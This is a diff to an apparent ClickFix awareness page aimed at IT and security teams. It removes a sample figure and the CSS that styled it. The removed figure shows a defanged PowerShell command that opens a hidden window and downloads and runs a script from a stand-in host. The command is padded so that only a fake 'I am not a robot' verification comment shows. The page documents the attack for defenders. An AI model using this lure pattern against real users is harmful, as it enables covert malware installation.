@@ -147,15 +147,6 @@ const timeline = [
     <section class="block wrap tech" id="for-it" aria-labelledby="it-title">
       <h2 id="it-title">For IT and security teams</h2>
 
-      <figure class="sample">
-        <pre><code>powershell -w h -c "iwr hxxps://cdn-check[.]example/v.ps1 | iex"                                        # ✅ I am not a robot - Verification ID: 4821</code></pre>
-        <figcaption>
-          Typical Windows payload, defanged. Hidden window, download-and-execute, padded so the Run box shows only
-          the comment.
-        </figcaption>
-      </figure>
-
-      <h3>Timeline</h3>
       <div class="table-scroll" role="region" aria-label="ClickFix timeline" tabindex="0">
         <table class="timeline">
           <tbody>
@@ -321,31 +312,6 @@ const timeline = [
   /* ---------- Technical ---------- */
   .more {
     margin-top: 2rem;
-  }
-
-  .sample {
-    margin-top: 1.5rem;
-  }
-
-  .sample pre {
-    overflow-x: auto;
-    border-radius: 8px;
-    padding: 1rem 1.1rem;
-    background: var(--ink);
-    color: #eef0f2;
-    font-size: 0.85rem;
-    line-height: 1.6;
-  }
-
-  .sample code {
-    overflow-wrap: normal;
-  }
-
-  .sample figcaption {
-    max-width: var(--measure);
-    margin-top: 0.6rem;
-    color: var(--muted);
-    font-size: 1rem;
   }
 
   .table-scroll {
